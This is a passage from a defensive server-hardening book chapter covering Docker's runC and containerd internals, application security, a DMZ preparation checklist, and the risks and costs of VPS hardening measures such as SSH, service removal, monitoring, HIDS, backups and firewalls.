<code>rw,noexec,nosuid,nodev,size=65536k</code></p>

<h5 id="vps-countermeasures-docker-runc-and-where-it-fits-in">runC and where it fits in</h5>

<p><strong>Docker engine</strong> is now built on containerd and runC. Engine creates the image indirectly via containerd -&gt; runC using <a href="https://github.com/opencontainers/runc/tree/master/libcontainer">libcontainer</a> -&gt; and passes it to containerd.</p>

<p><a href="https://containerd.io/"><strong>containerd</strong></a> (daemon for Linux or Windows):<br />
is based on the Docker engines core container runtime. It manages the complete container life-cycle, managing primitives on Linux and Windows hosts such as the following, whether directly or indirectly:</p>

<ul>
  <li>Image transfer and storage</li>
  <li>Container execution and supervision</li>
  <li>Management of network interfaces</li>
  <li>Local storage</li>
  <li>Native plumbing level API</li>
  <li>Full Open Container Initiative (OCI) support: image and runtime (runC) specification  </li>
</ul>

<p><a href="https://github.com/containerd/containerd"><code>containerd</code></a> calls <code>containerd-shim</code> which uses runC to run the container. <code>containerd-shim</code> allows the runtime, which is <code>docker-runc</code> in Dockers case to exit once it has started the container, thus allowing the container to run without a daemon. You can see this if you run<br />
<code>ps aux | grep docker</code><br />
In fact, if you run this command you will see how all the components hang together. Viewing this output along with the diagram below, will help solidify your understanding of the relationships between the components.</p>

<p><a href="https://runc.io/"><strong>runC</strong></a>: is the container runtime that runs containers (think, run Container) according to the OCI specification, runC is a small standalone command line tool (CLI) built on and providing interface to libcontainer, which does most of the work. runC provides interface with:</p>

<ul>
  <li>Linux Kernel Namespaces</li>
  <li>Cgroups</li>
  <li>Linux Security Modules</li>
  <li>Capabilities</li>
  <li>Seccomp</li>
</ul>

<p>These features have been integrated into the low level, light weight, portable, container runtime CLI called runC, libcontainer is doing most of the work. It has no dependency on the rest of the Docker platform, and has all the code required by Docker to interact with the container specific system features. More correctly, libcontainer is the library that interfaces with the above mentioned kernel features. runC leverages libcontainer directly, without the Docker engine being required in the middle.</p>

<p><a href="https://github.com/opencontainers/runc">runC</a> was created by the OCI, whos goal is to have an industry standard for container runtimes and formats, attempting to ensure that containers built for one engine can run on other engines.</p>


<figure class="image center" style="width: 396px;">
  <img src="images/DockerArchitecture.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<h6 id="leanpub-auto-using-runc-standalonehttpsopensourcecomlife168runc-little-container-engine-could">
  <a href="https://opensource.com/life/16/8/runc-little-container-engine-could">Using runC Standalone</a>
</h6>

<p>runC can be <a href="https://docker-saigon.github.io/post/Docker-Internals/#runc:cb6baf67dddd3a71c07abfd705dc7d4b">installed</a> separately, but it does come with Docker (in the form of <code>docker-runc</code>) as well. just run it to see the available commands and options.</p>

<p>runC allows us to configure and debug many of the above mentioned points we have discussed. If you want, or need to get to a lower level with your containers, using <code>runC</code> (or if you have Docker installed, <code>docker-runc</code>), directly can be a useful technique to interact with your containers. It does require additional work that <code>docker run</code> commands already do for us. First you will need to create an OCI bundle, which includes providing configuration in the host independent <code>config.json</code> and host specific <code>runtime.json</code> <a href="https://github.com/containerd/containerd/blob/0.0.5/docs/bundle.md#configs">files</a>. You must also construct or <a href="https://github.com/opencontainers/runc#creating-an-oci-bundle">export a root filesystem</a>, which if you have Docker installed you can export an existing containers root filesystem with <code>docker export</code>. </p>

<p>A container manifest (<code>config.json</code>) can be created by running:<br />
<code>runc spec</code><br />
which creates a manifest according to the Open Container Initiative (OCI)/runc specification. Engineers can then add any additional attributes such as capabilities on top of the three specified within a container manifest created by the <code>runc spec</code> command.</p>

<h5 id="vps-countermeasures-docker-application-security">Application Security</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionAVERAGE.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Yes container security is important, but in most cases, it is not the lowest hanging fruit for an attacker.</p>

<p>Application security is still the weakest point for compromise. It is usually much easier to attack an application running in a container or anywhere for that matter than it is to break container isolation or any security offered by containers or their infrastructure. Once an attacker has exploited any one of the commonly exploited vulnerabilities (such as any of the OWASP Top 10 for starters) still being introduced and found in our applications on a daily basis, and subsequently performed a remote code execution for example, and ex-filled the database, no amount of container security is going to mitigate this.   </p>

<p>During and before my <a href="http://www.se-radio.net/2017/05/se-radio-episode-290-diogo-monica-on-docker-security/">interview</a> of Diogo Mnica on Docker Security for the Software Engineering Radio show, we discussed Isolation concepts, many of which I have covered above. Diogo mentioned: why does isolation even matter when an attacker already has access to your internal network? There are very few attacks that require escaping from a container or VM in order to succeed, there are just so many easier approaches to compromise. Yes, this may be an issue for the cloud providers that are hosting containers and VMs, but for most businesses, the most common attack vectors are still attacks focussing on our weakest areas, such as people, password stealing, spear phishing, uploading and execution of web shells, compromising social media accounts, weaponised documents, and ultimately application security, as I have <a href="https://blog.binarymist.net/presentations-publications/#nzjs-2017-the-art-of-exploitation">mentioned many times</a> before.</p>

<p>Diogo and myself also had a <a href="http://www.se-radio.net/2017/05/se-radio-episode-290-diogo-monica-on-docker-security/">discussion</a> about the number of container vs VM vulnerabilities, and it is pretty clear that there are far more vulnerabilities <a href="https://xenbits.xen.org/xsa/">affecting VMs</a> than there are <a href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=docker">affecting containers</a>.</p>

<p>VMs have memory isolation, but many of the bugs listed in the <a href="https://xenbits.xen.org/xsa/">Xen CVEs</a> alone circumvent memory isolation benefits that VMs may have provided.</p>

<p>Another point that Diogo raised was the ability to monitor/inspect and control the behaviour of applications within containers. In VMs there is so much activity that is unrelated to your applications, so although you can monitor activity within VMs, the noise to signal ratio is just to high to get accurate indications of what is happening in and around your application that actually matters to you. VMs also provide very little ability to control the resources associated with your running application(s). Inside of a container, you have your application and hopefully little else. With the likes of <a href="chap03.html#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-control-groups">Control Groups</a> you have many points at which you can monitor and control aspects of the application environment.</p>

<p>As mentioned above, Docker containers are immutable, and can be run read-only.</p>

<p>The Secure Developer podcast with Guy Podjarny interviewing Ben Bernstein (CEO and founder of <a href="chap03.html#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-twistlock">Twistlock</a>) - <a href="http://www.heavybit.com/library/podcasts/the-secure-developer/ep-7-understanding-container-security/">show #7 Understanding Container Security</a> also echos these same sentiments.</p>

<p>Also be sure to check the <a href="chap07.html#additional-resources-vps-countermeasures-docker">Additional Resources</a> chapter for many excellent resources I collected along the way on Docker security.</p>

<h4 id="vps-countermeasures-using-components-with-known-vulnerabilities">Using Components with Known Vulnerabilities</h4>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionEASY.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Just do not do this. Either stay disciplined and upgrade your servers manually or automate it. Start out the way you intend to go. Work out your strategy for keeping your system(s) up to date and patched. There are many options here. If you go auto, make sure you test on a staging environment before upgrading live.</p>

<h4 id="vps-countermeasures-schedule-backups">Schedule Backups</h4>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionEASY.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Make sure all your data and VM images are backed up routinely. Make sure you test that restoring your backups work. Backup or source control system files, deployment scripts and what ever else is important to you. Make sure you have backups of your backups and source control. There are plenty of <a href="http://www.debianhelp.co.uk/backuptools.htm">tools</a> available to help. Also make sure you are backing up the entire VM if your machine is a virtual guest by export/import OVF files. I also like to backup all the VM files. Disk space is cheap. Is there such a thing as being too prepared for a disaster? I dont think I have seen it yet. It is just a matter of time before you will be calling on your backups.</p>

<h4 id="leanpub-auto-host-firewall">Host Firewall</h4>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionEASY.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>This is one of the last things you should look at. In fact, it is not really needed if you have taken the time to remove unnecessary services and harden what is left. If you use a host firewall keep your set of rules to a minimum to reduce confusion and increase legibility. Maintain both ingress &amp; egress.</p>

<h4 id="vps-countermeasures-preparation-for-dmz">Preparation for DMZ</h4>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionAVERAGE.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>The following is a final type of check-list that I like to use before opening a hardened web server to the world. You will probably have additional items you can add.</p>

<h5 id="leanpub-auto-confirm-dmz-has">Confirm DMZ has</h5>

<ol class="numeric">
  <li>
<a href="chap04.html#network-countermeasures-lack-of-visibility-nids">Network Intrustion Dettection System (NIDS)</a>, Network Intrusion Prevention System (NIPS) installed and configured correctly. Snort is a good place to start for the NIDS part, although with some work Snort can help with the <a href="https://www.ibm.com/developerworks/community/blogs/58e72888-6340-46ac-b488-d31aa4058e9c/entry/august_8_2012_12_01_pm6?lang=en">Prevention</a> also.</li>
  <li>Incoming access from your LAN or where ever you plan on administering it from.</li>
  <li>Rules for outgoing and incoming access to/from LAN, WAN tightly filtered.</li>
</ol>

<h5 id="leanpub-auto-additional-web-server-preparation">Additional Web Server Preparation</h5>

<ol class="numeric">
  <li>Set-up and configure your soft web server</li>
  <li>Set-up and configure caching proxy. Ex:
    <ul>
      <li>node-http-proxy</li>
      <li>TinyProxy</li>
      <li>Varnish</li>
      <li>nginx</li>
      <li>CloudFlare</li>
    </ul>
  </li>
  <li>Deploy application files, you may use Docker or one of my deployment tools<br />
<a href="https://github.com/binarymist/DeploymentTool">https://github.com/binarymist/DeploymentTool</a>  

<figure class="image center" style="width: 396px;">
  <img src="images/BinaryMistDeploymentTool.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>

  </li>
  <li>Hopefully you have been baking security into your web application right from the start. This is an essential part of defence in depth. Rather than having your application completely rely on other security layers to protect it, it should also be standing up for itself and understanding when it is under attack and actually <a href="chap06.html#web-applications-countermeasures-insufficient-attack-protection">fighting back</a>, as we discuss in the Web Applications chapter under Lack of Active Automated Prevention.</li>
  <li>Set static IP address</li>
  <li>Double check that the only open ports on the web server are 80 and what ever you have chosen for SSH.</li>
  <li>Set-up <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-tunneling-ssh">SSH tunnel</a>, so you can access your server from your LAN or where ever it is that you will be administering it from.</li>
  <li>Decide on, document VM <a href="chap03.html#vps-countermeasures-schedule-backups">backup strategy</a>, set it up, and make sure your team knows all about it. Do not be that single point of failure.</li>
</ol>

<h4 id="leanpub-auto-post-dmz-considerations">Post DMZ Considerations</h4>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionEASY.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<ol class="numeric">
  <li>Set-up your <code>CNAME</code> or what ever type of <code>DNS</code> record you are using</li>
  <li>Now remember, keeping any machine on (not just the internet, but any) a network requires constant consideration and effort in keeping the system as secure as possible.</li>
  <li>
<a href="https://www.debian.org/doc/manuals/securing-debian-howto/ch-automatic-harden.en.html#s6.1">Work through</a> using the likes of <a href="https://packages.debian.org/wheezy/harden">harden</a> and <a href="https://cisofy.com/lynis/">Lynis</a> for your server and <a href="https://packages.debian.org/wheezy/harden-surveillance">harden-surveillance</a> for monitoring your network.</li>
  <li>Consider combining Port Scan Attack Detector (<a href="https://packages.debian.org/stretch/psad">psad</a>) with <a href="https://packages.debian.org/stretch/fwsnort">fwsnort</a> and Snort.</li>
  <li>Hack your own server and find the holes before someone else does. If you are not already familiar with the tricks of how systems on the internet get attacked, read up on the <a href="http://www.tldp.org/HOWTO/Security-Quickstart-HOWTO/appendix.html#THREATS">Attacks and Threats</a>, Run <a href="https://blog.binarymist.net/2014/03/29/up-and-running-with-kali-linux-and-friends/#vulnerability-scanners">OpenVAS</a>, Run <a href="https://blog.binarymist.net/2014/03/29/up-and-running-with-kali-linux-and-friends/#web-vulnerability-scanners">Web Vulnerability Scanners</a> </li>
</ol>

<h3 id="vps-risks-that-solution-causes">4. SSM Risks that Solution Causes</h3>
<blockquote>
  <p>Are there any? If so what are they?</p>
</blockquote>

<ul>
  <li>Just beware that if you are intending to break the infrastructure or even what is running on your VPS(s) if they are hosted on someone elses infrastructure, that you make sure you have all the tests you intend to carry out documented, including what could possibly go wrong, accepted and signed by your provider. Good luck with this. That is why self hosting is often easier</li>
  <li>Keep in mind: that if you do not break your system(s), someone else will</li>
  <li>Possible time constraints: It takes time to find skilled workers, gain expertise, set-up and configure</li>
  <li>Many of the points I have raised around VPS hardening require maintenance, you can not just set-up once and forget about it</li>
</ul>

<h4 id="leanpub-auto-forfeit-control-thus-security">Forfeit Control thus Security</h4>

<p>Bringing your VPS(s) in-house can provide certainty and reduce risks of vendor lock-in, but the side-effect to this, is that you may not get your solution to market quick enough, and someone else beats you, which may mean the end of business for you. Many of the larger cloud providers are getting better at security and provide many tools and techniques for hardening the resources you hire.</p>

<h4 id="leanpub-auto-windows-1">Windows</h4>

<h5 id="leanpub-auto-psexec-and-pass-the-hash-pth">PsExec and Pass The Hash (PTH)</h5>

<p>Often SMB services are required, so turning them off may not be an option.</p>

<p>Some of the <a href="chap03.html#vps-countermeasures-psexec-pth">countermeasures</a> may introduce some inconvenience.</p>

<p>There is the somewhat obvious aspect that applying the countermeasures will take some research to work out what can be done and the length of time it will take to do it.</p>

<h5 id="leanpub-auto-powershell-exploitation-with-persistence">PowerShell Exploitation with Persistence</h5>

<p>Next generation Anti-Virus (AV) using machine learning is currently expensive.</p>

<p>Deep Script Block Logging can consume large amounts of disk space if you have enabling Log script block invocation start / stop events turned on.</p>

<h4 id="leanpub-auto-minimise-attack-surface-by-installing-only-what-you-need-1">Minimise Attack Surface by Installing Only what you Need</h4>

<p>You may not have something installed that you need.</p>

<h4 id="leanpub-auto-disable-remove-services-harden-what-is-left">Disable, Remove Services. Harden what is left</h4>

<p>You may find some stage later on that a component that you removed is actually needed.</p>

<h5 id="vps-risks-that-solution-causes-disable-remove-services-harden-what-is-left-partitioning-on-os-installation">Partitioning on OS Installation</h5>

<p>This process can sometimes lock things down to tightly. I would much rather go to far here and have to back things off a little, or get creative with a script to unmount, remount with less restrictions applied, perform the action you need, then mount again according to the <code>/etc/fstab</code>. This is similar to the <a href="chap03.html#vps-risks-that-solution-causes-disable-remove-services-harden-what-is-left-mounting-of-partitions">Mounting of Partitions</a> section below</p>

<h5 id="leanpub-auto-review-password-strategies">Review Password Strategies</h5>

<p>The default number of rounds applied to the key stretching process by the Unix C library (Crypt) <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies-default-number-of-rounds">has not changed</a> in the last 9 years. I addressed this in the Countermeasures section, but most people will not bother increasing this value. I would <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies-owasp-advice">recommend doing so</a>.</p>

<h5 id="leanpub-auto-ssh-1">SSH</h5>

<p>Just because you may be using SSH and SSH itself is secure, does not mean you are using it in a secure way. If you follow my advice in the Countermeasures section you will be fine. SSH can be used in insecure ways.</p>

<p>When you make configuration changes to SSH, it often pays to either have physical access or have more than one SSH session open when you make the change -&gt; restart SSH -&gt; exit your session, otherwise you run the risk of locking yourself out.</p>

<h5 id="leanpub-auto-disable-boot-options-1">Disable Boot Options</h5>

<p>If you have to boot from an alternative medium such as a rescue CD, you may wonder why this does not work.</p>

<h5 id="vps-risks-that-solution-causes-disable-remove-services-harden-what-is-left-mounting-of-partitions">Mounting of Partitions</h5>

<p>You may lock yourself out of being able to administer your system. This is similar to the <a href="chap03.html#vps-risks-that-solution-causes-disable-remove-services-harden-what-is-left-partitioning-on-os-installation">Partitioning on OS Installation</a> section above.</p>

<h5 id="leanpub-auto-portmap">Portmap</h5>

<p>If you are using portmap, consider swapping it for rpcbind.</p>

<h5 id="leanpub-auto-exim-1">Exim</h5>

<p>You may be using Exim. Make sure you are not before you disable it.</p>

<h5 id="leanpub-auto-remove-nis-1">Remove NIS</h5>

<p>You may be using NIS+. Make sure you are not before you disable it.</p>

<h5 id="leanpub-auto-rpcbind-1">Rpcbind</h5>

<p>As discussed in the <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-rpcbind">Countermeasures</a> section, just make sure you have no need for Rpcbind before you remove it. Taking the slightly safer approach of just denying rpcbind responses in the <code>/etc/hosts.deny</code> is also an option.</p>

<h5 id="leanpub-auto-telnet">Telnet</h5>

<p>Someone legitimate may be relying on telnet. If this is the case, you may have larger problems than telnet. The Ignorance section of Identify Risks of the People chapter in Fascicle 0 may be pertinent here.  </p>

<h5 id="leanpub-auto-ftp-1">FTP</h5>

<p>You may have some staff that are set in their ways. Gently coax them to understand the complete absence of security with FTP and the issues with FTPS.</p>

<h5 id="leanpub-auto-nfs-1">NFS</h5>

<p>Possible misconfiguration, make sure you test your configuration thoroughly after changes.</p>

<h4 id="leanpub-auto-lack-of-visibility">Lack of Visibility</h4>

<p>Possibly false confidence in the tools that are supposed to provide visibility. Using a collecting of similar tools can be a good idea. The attacker only needs to miss one then.</p>

<p>Of course any of the visibility providing tools can be replaced with trojanised replicas, unless you have a <a href="chap03.html#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids">Host Intrusion Detection System (HIDS)</a> running from a location that the attacker is not aware of, continually checking for the existence and validity of the core system components.</p>

<h5 id="leanpub-auto-logging-and-alerting">Logging and Alerting</h5>

<p>There are lots of options to choose from in this space.</p>

<p>Logging and Alerting is never going to be a complete solution. There is risk that people think that one or two tools mean they are covered from every type of attack, this is never the case. A large array of diverse countermeasures is always going to be required to produce good visibility of your system(s). Even using multiple tools that do similar jobs but take different strategies on how they execute and in-fact from where they run.</p>

<h5 id="leanpub-auto-web-server-log-management">Web Server Log Management</h5>

<p>There are some complexities that you need to understand in order to create a water-tight and reliable off-site logging system. I discuss these in the Countermeasures section along with testing and verifying your logs are being transferred privately.</p>

<h5 id="leanpub-auto-proactive-monitoring">Proactive Monitoring</h5>

<p>Over confidence in monitoring tools. For example an attacker could try and replace the configuration files for Monit or the Monit daemon itself, so the following sorts of tests would either not run or return tampered with results:</p>

<ul>
  <li>File checksum testing</li>
  <li>File size testing</li>
  <li>File content testing</li>
  <li>Filesystem flags testing</li>
</ul>

<p>In saying that, if you have an agentless (running from somewhere else) file integrity checker or even several of them running on different machines and as part of their scope are checking Monit, then the attacker is going to have to find the agentless file integrity checker(s) and disable them also without being noticed. Especially as I disguised in regards to Stealth, that the recommendation was that the Monitor not accept any incoming connections, and be in a physically safe location. This is increasing the level of difficulty for an attacker significantly.</p>

<p>You could and should also have NIDs running on your network which makes this even more likely that an attacker is going to step on a land mine.</p>

<h5 id="leanpub-auto-statistics-graphing">Statistics Graphing</h5>

<p>There are new components introduced, which increases attack surface.</p>

<h5 id="leanpub-auto-host-intrusion-detection-systems-hids">Host Intrusion Detection Systems (HIDS)</h5>

<p>The benefits far outweigh any risks here.</p>

<p>Using a system like Stealth as your file integrity checker that resides on a server(s) <a href="chap03.html#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-stealth-what-i-like">somewhere else</a> that run against the target server, means an attacker will very often not realise that they are under observation if they can not see the observer running on the machine that they are on.</p>

<p>This sort of strategy provides a false sense of self security for the attacker. In a way a similar concept to the honey pot. They may know about a tool operating on the server they are on and even have disabled it, but if you keep the defence in depth mentality, there is no reason that you can not have the upper hand without the attacker being aware of it.</p>

<p>You can also take things further with honey pits and mirages, these are modules in code that actively produce answers designed to confuse and confound poking and prodding attackers. This can create perfect ambush and burn up the attackers time. Attackers have budgets too. The longer it takes an attacker to compromise your system(s), the more likely they are to start making mistakes and get caught.</p>

<h4 id="leanpub-auto-docker">Docker</h4>

<p>Docker security is a balancing act. There are many things you can do, that will not disadvantage you in any way. Experiment.</p>

<h6 id="leanpub-auto-linux-security-modules-lsm-1">Linux Security Modules (LSM)</h6>

<p>There are hundreds of LSM security hooks throughout the kernel, these hooks provide additional attack surface. An attacker with a buffer overflow vulnerability for example may be able to insert their own byte code and bypass the LSM provided implementation, or even redirect to a payload of their choosing. James Morris, a Linux Kernel Developer discussed this on his <a href="https://blog.namei.org/2017/03/09/hardening-the-lsm-api/">blog</a>.</p>

<p>Employing a LSM and learning its intricacies and how to configure it is a bit of a learning curve, but one that is often well worth the effort, and this does not just apply to Docker, but all of the hundreds of resources that the kernel attempts to manage.</p>

<h4 id="leanpub-auto-schedule-backups">Schedule Backups</h4>

<p>Relying on scheduled backups that do not exist or have in some way failed. Make sure you test your backups routinely. What you use to backup will obviously depend on where you are operating and what you are trying to backup. For example, if you are backing up Docker containers, just get those Dockerfiles in source control. If you are backing up VPSs locally, use your preferred infrastructure management tool, such as <a href="http://www.se-radio.net/2017/04/se-radio-episode-289-james-turnbull-on-declarative-programming-with-terraform/">Terraform</a>. If you are in the cloud, your provider will almost certainly have a tool for this.</p>

<h4 id="leanpub-auto-host-firewall-1">Host Firewall</h4>

<p>Personally I prefer not to rely on firewalls, once you have removed any surplus services and hardened what is left, firewalls do not provide a lot of benefit. I recommend not relying on them, but instead making your system(s) hard enough so that you do not require a firewall. Then if you decide to add one, they will be just another layer of defence. Dependence on firewalls often produce a single point of failure and a false sense of security, as to much trust is placed in them to protect weak and vulnerable services and communications that should instead be hardened themselves.</p>

<h3 id="vps-costs-and-trade-offs">5. SSM Costs and Trade-offs</h3>

<h4 id="leanpub-auto-forfeit-control-thus-security-1">Forfeit Control thus Security</h4>

<p>If you choose to go the default way now and rely on others for your compute, these are some things <a href="https://www.owasp.org/images/7/71/2017-04-20-TrustMeImACloud.pdf">you should consider</a>:</p>

<ul>
  <li>Vendor lock-in
    <ul>
      <li>Infrastructure as a Service (IaaS)</li>
      <li>Software as a Service (SaaS)</li>
      <li>Platform as a Service (PaaS)</li>
      <li>Serverless Technologies</li>
      <li>Is it even possible to move to an on-premise solution?</li>
    </ul>
  </li>
  <li>What happens when your provider goes down, looses your data? Can you or your business survive without them or without the data they are hosting?</li>
  <li>Do you have a strategy in place for the event that your provider(s) discontinue their service. How quickly can you migrate? Where would you migrate to? Will you be able to retrieve your data? Do you actually own your data?</li>
  <li>Do your providers have Service Level Agreements (SLAs) and have you tested them?</li>
  <li>Fault tolerance, capacity management and scalability is often (not always) better with cloud providers</li>
  <li>Do you back up your data and have you tested the restoration of it, or do you also out-source this? If so, have your tested the out-sourced providers data secrecy and recoverability? You will also have to do this regularly, just because a provider passes once, does not mean it always will. Providers consist of people to, and people make mistakes</li>
  <li>Do you test your disaster recovery plan regularly? If you own your own infrastructure, you can get hands-on access, in the cloud this is usually impossible</li>
  <li>Do you have a strategy in place for when your accounts with your providers are locked out or hijacked by a malicious actor? Have you tested it? If you own your own infrastructure, you have far more control with this</li>
  <li>Do you have security solutions in the cloud also, what happens if they become unavailable?</li>
</ul>

<h4 id="leanpub-auto-windows-2">Windows</h4>

<h5 id="leanpub-auto-psexec-and-pass-the-hash-pth-1">PsExec and Pass The Hash (PTH)</h5>

<p>Work through the collection of <a href="chap03.html#vps-countermeasures-psexec-pth">Countermeasure items</a> and just as we did in the Countermeasures section of the 30,000 view chapter of Fascicle 0 you should have already applied a relative number for the amount of work to be done to the Countermeasure Product Backlog Items. The Costs and Trade-offs will often become obvious as you iterate on the countermeasure work itself.</p>

<h5 id="leanpub-auto-powershell-exploitation-with-persistence-1">PowerShell Exploitation with Persistence</h5>

<p>Personally I think the cost of next generation AV with machine learning is worth the investment.</p>

<p>You could consider not turning on enabling Log script block invocation start / stop events, I would sooner have it on and consider getting your logs off-site as we discussed in the <a href="chap03.html#vps-countermeasures-lack-of-visibility-logging-and-alerting">Logging and Alerting</a> section, with a well configured logrotate schedule.</p>

<h4 id="leanpub-auto-minimise-attack-surface-by-installing-only-what-you-need-2">Minimise Attack Surface by Installing Only what you Need</h4>

<p>When you find out you need something, research it along with alternatives. Work out whether the additional attack surface is worth the functionality you wish to add.</p>

<h4 id="leanpub-auto-disable-remove-services-harden-what-is-left-1">Disable, Remove Services. Harden what is left</h4>

<p>Do your home work up front and decide what is actually required to stay and what is not. In most cases re-enabling or re-adding will only cost you time.</p>

<h5 id="leanpub-auto-partitioning-on-os-installation">Partitioning on OS Installation</h5>

<p>Often a little trial and error is required to get the optimal configuration for your needs.</p>

<h5 id="leanpub-auto-review-password-strategies-1">Review Password Strategies</h5>

<p>Making these changes takes a little time, depending on how familiar you are with Crypt and how it does things.</p>

<p>If you use Docker and do not run as root, then you have another layer that any attacker has to break through in order to get to the host system. This lifts the bar significantly on host password compromise.</p>

<h5 id="vps-costs-and-trade-offs-disable-remove-services-harden-what-is-left-ssh">SSH</h5>

<p>SSH is secure by definition, in saying that, you can still use it insecurely. I have seen some organisations store their private keys on their developer wiki so that all the developers within the company can easily access the private key and copy it locally. Do not do this, there are so many things wrong with this.</p>

<p>Make sure you use a pass phrase unless you have a good reason not to, and can in some other way safeguard your SSH access, like using <a href="https://fbb-git.github.io/ssh-cron/ssh-cron.1.html">ssh-cron</a> for example.</p>

<h5 id="leanpub-auto-disable-boot-options-2">Disable Boot Options</h5>

<p>I am sure you will be smart enough to work it out. Just re-enable the boot option from what ever device it is you are trying to boot from, and do not forget to disable it once you are finished.</p>

<h5 id="leanpub-auto-mounting-of-partitions">Mounting of Partitions</h5>

<p>Locking yourself out of being able to administer your system due to overly zealous restrictive mount options is not the end of the world, just boot from a live CD and you will be able to adjust your <code>/etc/fstab</code>.</p>

<p>This is also a place where Docker containers shine, by using the <a href="chap03.html#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-read-only-containers"><code>--read-only</code></a> flag and many other options that can help immensely, be sure to check the Docker sections if you have not already. </p>

<h5 id="leanpub-auto-portmap-1">Portmap</h5>

<p>Portmap is simple to disable, go ahead.</p>

<h5 id="leanpub-auto-exim-2">Exim</h5>

<p>If you are not using Exim, it only takes a few minutes to disable, so go ahead.</p>

<h5 id="leanpub-auto-remove-nis-2">Remove NIS</h5>

<p>I am not aware of any costs with removing NIS if it is not necessary, and if it is being used, consider using something else.</p>

<h5 id="leanpub-auto-rpcbind-2">Rpcbind</h5>

<p>I am not aware of any costs with removing or disabling responses from rpcbind if it is not required.</p>

<h5 id="leanpub-auto-telnet-1">Telnet</h5>

<p>If someone legitimate is still relying on telnet, send them to the <a href="chap03.html#vps-identify-risks-unnecessary-and-vulnerable-services-telnet">Risks</a> section followed by the <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-telnet">Countermeasures</a> section.</p>

<h5 id="leanpub-auto-ftp-2">FTP</h5>

<p>If you can convince your staff to read and understand the issues with FTP, and FTPS including the possible confusion around how to use FTPS securely, what can go wrong, and mandate a more secure file transfer protocol such as the recommended SFTP or SCP, then you just need to make sure SSH is not being <a href="chap03.html#vps-costs-and-trade-offs-disable-remove-services-harden-what-is-left-ssh">used incorrectly</a></p>

<h5 id="leanpub-auto-nfs-2">NFS</h5>

<p>If you are using NFS, there is some configuration required, this can take a few minutes. Scripting this for a configuration management tool is a good idea if you need to apply the same configuration to many servers.</p>

<h4 id="leanpub-auto-lack-of-visibility-1">Lack of Visibility</h4>

<p>All of the suggested offerings under this heading take time to set-up. Evaluate where your weakest areas are, and which offerings will give you the best results for your situation, and start there.</p>

<h5 id="leanpub-auto-logging-and-alerting-1">Logging and Alerting</h5>

<p>You will need to invest time into understanding what each offering does, its strengths and weaknesses</p>

<h5 id="leanpub-auto-web-server-log-management-1">Web Server Log Management</h5>

<p>This will take some time to set-up, test and verify all the requirements. It is essential to have reliable off-site logging on most systems.</p>

<h5 id="leanpub-auto-proactive-monitoring-1">Proactive Monitoring</h5>

<p>There was quite a bit of time spent in the Countermeasures section, but most of that work is now done for you. Now it is just a matter of following the steps I have laid out.</p>

<h5 id="leanpub-auto-statistics-graphing-1">Statistics Graphing</h5>

<p>I have found these tools to be well worth the investment when you are dealing with hosts. We also cover <a href="chap06.html#web-applications-countermeasures-lack-of-visibility-insufficient-Monitoring-statistics-graphing">statsd</a> in the Web Applications chapter which performs a similar role for the application itself, which if you are using Docker containers, the lowest hanging fruit in terms of security from an external attackers perspective defiantly falls on your application code.</p>

<h5 id="leanpub-auto-host-intrusion-detection-systems-hids-1">Host Intrusion Detection Systems (HIDS)</h5>

<p>HIDS are one of the must haves on your systems, they also need to be set-up as early as possible, ideally before the server has been exposed to the internet, or any network that has the potential for an attacker to gain access and plant malware.</p>

<h4 id="leanpub-auto-docker-1">Docker</h4>

<p>Some of the extra steps you may take from the default security standpoint with Docker may restrict some flexibility, when and if this happens, just back them off a bit. There are many aspects to hardening Docker that have no negative side effects at all. Concentrate on these after you have your application security to a good level, usually that in itself is a lot of work.</p>

<h4 id="leanpub-auto-schedule-backups-1">Schedule Backups</h4>

<p>There are many ways to do this. If you are a one man band, really simple techniques may work well, if you are a large shop, you will ideally want an automated solution, whether you build it yourself or rely on someone else to do it.</p>

<p>Work out what you need, count the costs of that data being lost, measure the cost of the potential solutions, and compare.</p>

<p>I have used rsync in many shapes and forms for many years and it has been good. Check your backup logs to make sure what you think is happening is. When you are setting up your backup scripts, dry-run test them, to make sure you do not over-write something or some place that was not intended.</p>

<p>You can run scripts manually if you are disciplined and they are very easy, otherwise it usually pays to automate them. Cron does what it says it will do on the box.</p>

<h4 id="leanpub-auto-host-firewall-2">Host Firewall</h4>

<p>A host firewall can be a good temporary patch, and that is the problem. Nothing is as permanent as a temporary patch. A firewall is a single layer of defence and one that is often used to hide the inadequacies of the rest of the layers of defence.</p>



</div>
</body>
</html>
